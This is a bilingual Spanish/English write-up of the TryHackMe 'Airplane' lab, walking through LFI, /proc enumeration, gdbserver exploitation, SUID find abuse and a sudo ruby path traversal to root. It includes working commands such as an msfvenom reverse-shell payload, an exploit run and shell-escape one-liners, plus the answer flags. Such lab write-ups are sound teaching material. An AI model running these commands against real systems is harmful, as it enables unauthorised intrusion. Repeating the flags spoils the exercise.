# Airplane
| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `airplane` |
| **Link** | [TryHackMe](https://tryhackme.com/room/airplane) |
| **Sección** | Linux / CTF |
| **Fuente** | Writeup de Christ Elise (christelise.github.io), Sidharth Panda (InfoSec Write-ups), 0xBEN (benheater.com) y naval0505 (GitHub) |
| **Componentes** | Linux, LFI (?page=), /proc, gdbserver (6048), Metasploit gdb_server_exec, SUID find, SSH, sudo ruby wildcard, path traversal, ffuf, rustscan/nmap, msfvenom |
| **Impacto** | Máquina Linux de dificultad media. "Are you ready to fly?" — la cadena de ataque combina LFI, enumeración de /proc, explotación de gdbserver, abuso de SUID y una regla sudo mal configurada para obtener user y root. |
---
**Contexto:** Máquina Linux de dificultad media. "Are you ready to fly?" — la cadena de ataque combina LFI, enumeración de /proc, explotación de gdbserver, abuso de SUID y una regla sudo mal configurada.
*EN: Medium difficulty Linux machine. "Are you ready to fly?" — the attack chain combines LFI, /proc enumeration, gdbserver exploitation, SUID abuse, and a misconfigured sudo rule.*
## Solucionario
### Task 1 — Flags
**Explicación:** Cadena completa: Nmap → app web Werkzeug (8000) → ffuf → LFI en `?page=` → `/etc/passwd`(usuarios hudson, carlos) → iteración `/proc/<pid>/cmdline` → gdbserver en 6048 → exploit Metasploit `gdb_server_exec` → shell como **hudson** → SUID `find` (propietario carlos) → shell como **carlos** → key SSH en `authorized_keys` → user flag → `sudo -l` descubre regla ruby con wildcard `/root/*.rb` → path traversal `/root/../tmp/shell.rb` → root shell → root flag.
*EN: Full chain: Nmap → Werkzeug web app (8000) → ffuf → LFI in `?page=` → `/etc/passwd` (hudson, carlos users) → iterate `/proc/<pid>/cmdline` → gdbserver on 6048 → Metasploit `gdb_server_exec` exploit → shell as **hudson** → SUID `find` (owner carlos) → shell as **carlos** → SSH key into `authorized_keys` → user flag → `sudo -l` reveals ruby rule with wildcard `/root/*.rb` → path traversal `/root/../tmp/shell.rb` → root shell → root flag.*

```bash
rustscan airplane.thm -- -A -vvv
ffuf -u http://airplane.thm:8000/?page=FUZZ -w /usr/share/wordlists/dirb/common.txt
searchsploit gdbserver
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<vpn_ip> LPORT=<port> PrependFork=true -o pay.bin
python3 50539.py airplane.thm:6048 pay.bin
find . -exec /bin/sh -p \; -quit
sudo /usr/bin/ruby /root/../tmp/shell.rb
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user flag? | `eebfca2ca5a2b8a56c46c781aeea7562` |
| 2 | What is the root flag? | `190dcbeb688ce5fe029f26a1e5fce002` |
---
**Metodología:** Recon (rustscan/nmap: 3 puertos; web Werkzeug 8000 + servicio 6048) → enumeración web (ffuf → `?page=` LFI) → LFI + `/proc` para listar procesos → explotar gdbserver (exploit 50539.py + msfvenom shell_reverse_tcp) → shell hudson → SUID `find` (GTFOBins) → shell carlos → inyección de clave SSH → escalada a root vía sudo ruby con wildcard y path traversal.
**Learning chain:** LFI → enumeración de procesos vía /proc → abuso de servicio de depuración (gdbserver) → SUID misconfigurado → sudo con wildcard → compromiso total.
**MITRE ATT&CK:** T1505.003 (Web Shell)/T1190, T1595 (Active Scanning), T1005 (Data from Local System - /proc), T1548.001 (Setuid and Setgid), T1548.003 (Sudo), T1021.001 (Remote Desktop)/SSH key, T1071.001.
**Fuente:** [TryHackMe - Airplane](https://tryhackme.com/room/airplane)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
